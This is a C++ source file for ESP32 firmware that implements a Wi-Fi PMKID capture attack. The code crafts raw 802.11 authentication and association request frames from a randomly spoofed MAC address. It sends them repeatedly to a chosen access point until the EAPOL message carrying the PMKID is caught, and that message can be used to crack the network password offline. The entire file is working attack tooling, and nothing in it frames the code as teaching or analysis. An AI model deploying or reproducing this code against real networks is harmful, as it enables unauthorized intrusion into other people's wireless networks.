#include "PmkidManager.hpp"
#include "HandshakeCatcher.hpp"
#include <esp_wifi.h>
#include <esp_random.h>
#include <cstring>
#include <algorithm>

using namespace std;

static uint16_t g_sequenceNumber = 0;

PmkidManager& PmkidManager::GetInstance()
{
    static PmkidManager instance;
    return instance;
}

void PmkidManager::StartAttack(const MacAddress& apMac, string_view ssid, uint8_t channel)
{
    if (isActive_.load()) StopAttack();

    authSent_.store(0);
    assocSent_.store(0);
    handshakeCaught_.store(false);
    
    targetAp_ = apMac;
    targetSsid_ = string(ssid);
    targetChannel_ = channel;
    
    MacAddress broadcastMac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    HandshakeCatcher::GetInstance().SetTarget(apMac, broadcastMac);
    
    isActive_.store(true);
    xTaskCreate(AttackTask, "PmkidTask", 4096, this, 2, &attackTaskHandle_);
}

void PmkidManager::StopAttack()
{
    if (!isActive_.load()) return;
    
    isActive_.store(false);
    
    if (attackTaskHandle_ != nullptr)
    {
        vTaskDelay(pdMS_TO_TICKS(50));
        if (attackTaskHandle_ != nullptr) 
        {
             vTaskDelete(attackTaskHandle_);
             attackTaskHandle_ = nullptr;
        }
    }
    HandshakeCatcher::GetInstance().ClearTarget();
}

void PmkidManager::OnEapolReceived(const MacAddress& srcMac)
{
    if (isActive_.load() && !handshakeCaught_.load())
    {
        if (srcMac == targetAp_)
        {
            handshakeCaught_.store(true);
        }
    }
}

void PmkidManager::SendAuthFrame(const MacAddress& apMac, const MacAddress& myMac)
{
    uint8_t frame[30] __attribute__((aligned(4))) = {
        0xB0, 0x00,                         // Frame Control
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // SA
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x00, 0x00,                         // Auth Algorithm
        0x01, 0x00,                         // Auth Sequence
        0x00, 0x00                          // Status Code
    };

    memcpy(&frame[4], apMac.addr, 6);
    memcpy(&frame[10], myMac.addr, 6);
    memcpy(&frame[16], apMac.addr, 6);

    uint16_t seqControl = (g_sequenceNumber << 4);
    frame[22] = seqControl & 0xFF;
    frame[23] = (seqControl >> 8) & 0xFF;
    
    g_sequenceNumber++;
    if (g_sequenceNumber > 0xFFF) g_sequenceNumber = 0;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}

void PmkidManager::SendAssocReqFrame(const MacAddress& apMac, const MacAddress& myMac, string_view ssid)
{
    uint8_t frame[256] __attribute__((aligned(4)));
    size_t offset = 0;

    uint8_t header[] = {
        0x00, 0x00,
        0x3A, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
    };
    
    memcpy(&header[4], apMac.addr, 6);
    memcpy(&header[10], myMac.addr, 6);
    memcpy(&header[16], apMac.addr, 6);
    
    uint16_t seqControl = (g_sequenceNumber << 4);
    header[22] = seqControl & 0xFF;
    header[23] = (seqControl >> 8) & 0xFF;
    
    g_sequenceNumber++;
    if (g_sequenceNumber > 0xFFF) g_sequenceNumber = 0;

    memcpy(frame, header, sizeof(header));
    offset += sizeof(header);

    frame[offset++] = 0x11; 
    frame[offset++] = 0x00; 
    frame[offset++] = 0x0A; 
    frame[offset++] = 0x00; 

    size_t ssidLen = min<size_t>(ssid.length(), 32);
    frame[offset++] = 0x00;
    frame[offset++] = ssidLen;
    memcpy(&frame[offset], ssid.data(), ssidLen);
    offset += ssidLen;

    uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
    memcpy(&frame[offset], rates, sizeof(rates));
    offset += sizeof(rates);

    uint8_t extRates[] = {0x32, 0x04, 0x0C, 0x12, 0x18, 0x60};
    memcpy(&frame[offset], extRates, sizeof(extRates));
    offset += sizeof(extRates);

    uint8_t htCaps[] = {
        0x2D, 0x1A, 
        0x2C, 0x01, 0x03, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    memcpy(&frame[offset], htCaps, sizeof(htCaps));
    offset += sizeof(htCaps);

    uint8_t rsn[] = {
        0x30, 0x26,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x04,
        0x01, 0x00,
        0x00, 0x0F, 0xAC, 0x02,
        0x00, 0x00,
        0x01, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    memcpy(&frame[offset], rsn, sizeof(rsn));
    offset += sizeof(rsn);

    esp_wifi_80211_tx(WIFI_IF_STA, frame, offset, true);
}

void PmkidManager::AttackTask(void* arg)
{
    PmkidManager* manager = static_cast<PmkidManager*>(arg);
    esp_wifi_set_channel(manager->targetChannel_, WIFI_SECOND_CHAN_NONE);

    MacAddress spoofedMac;
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    memcpy(&spoofedMac.addr[0], &r1, 4);
    memcpy(&spoofedMac.addr[4], &r2, 2);
    spoofedMac.addr[0] &= 0xFE;
    spoofedMac.addr[0] |= 0x02;

    while (manager->isActive_.load() && !manager->handshakeCaught_.load())
    {
        manager->SendAuthFrame(manager->targetAp_, spoofedMac);
        manager->authSent_.fetch_add(1);
        
        vTaskDelay(pdMS_TO_TICKS(10));
        
        manager->SendAssocReqFrame(manager->targetAp_, spoofedMac, manager->targetSsid_);
        manager->assocSent_.fetch_add(1);
        
        vTaskDelay(pdMS_TO_TICKS(100)); 
    }

    manager->attackTaskHandle_ = nullptr;
    vTaskDelete(nullptr);
}